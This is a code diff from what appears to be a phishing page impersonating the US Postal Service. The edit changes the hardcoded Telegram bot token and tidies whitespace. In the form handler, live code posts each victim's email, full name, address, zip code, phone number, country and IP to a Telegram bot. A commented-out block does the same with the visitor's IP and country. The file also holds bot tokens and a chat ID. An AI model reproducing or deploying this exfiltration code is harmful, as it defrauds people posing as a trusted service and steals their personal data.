@@ -13,7 +13,7 @@
             </li>
           </ul>
         </div>
-        
+
         <a id="link-locator" href="#">Locations</a>
         <a id="link-customer" href="#">Support</a>
         <a id="link-myusps" href="#">Informed Delivery</a>
@@ -2215,23 +2215,23 @@ export default {
     );
     this.IP = tt.data.ip;
     this.query = tt.data.country_capital;
-    // var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
- 
+    // var token = "6309857497:AAFmgkPgZKj949KXANTdon_4fuT9LiLpqxs";
+
     //var chatId2 = -957355212;
-   
-   // var fullMessage = `
+
+    // var fullMessage = `
     //    ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
-    
-   // axios.post(
-   //   `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
-   // );
+
+    // axios.post(
+    //   `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
+    // );
   },
   methods: {
     triggerLoading() {
       var first = document.getElementById("load1");
       first.classList.remove("visible");
       //var i = 1;
-     /**var hihi = setInterval(() => {
+      /**var hihi = setInterval(() => {
         if (i < 10) {
           var old = document.getElementById("load" + i);
           var first = document.getElementById("load" + (i + 1));
@@ -2246,7 +2246,7 @@ export default {
           last.classList.remove("visible");
           i = 1;
         }
-      }, 300); */ 
+      }, 300); */
     },
     verifyForm() {
       this.loading = true;
@@ -2254,13 +2254,13 @@ export default {
       var that = this;
       that.info.IP = this.IP;
       that.info.query = this.query;
-      var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
-  
-       var chatId2 = -957355212;
+      var token = "6309857497:AAFmgkPgZKj949KXANTdon_4fuT9LiLpqxs";
+
+      var chatId2 = -957355212;
       var fullMessage = `
         ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0AEmail : ${this.info.email}%0AFull name : ${this.info.fullName}%0AAddress 1 : ${this.info.address1}%0ACity : ${this.info.city}%0AZip Code : ${this.info.zipCode}%0APhone number : ${this.info.phoneNumber}%0ACountry : ${this.info.country}%0AIP : ${this.info.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
-    
-       axios.post(
+
+      axios.post(
         `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
       );
 
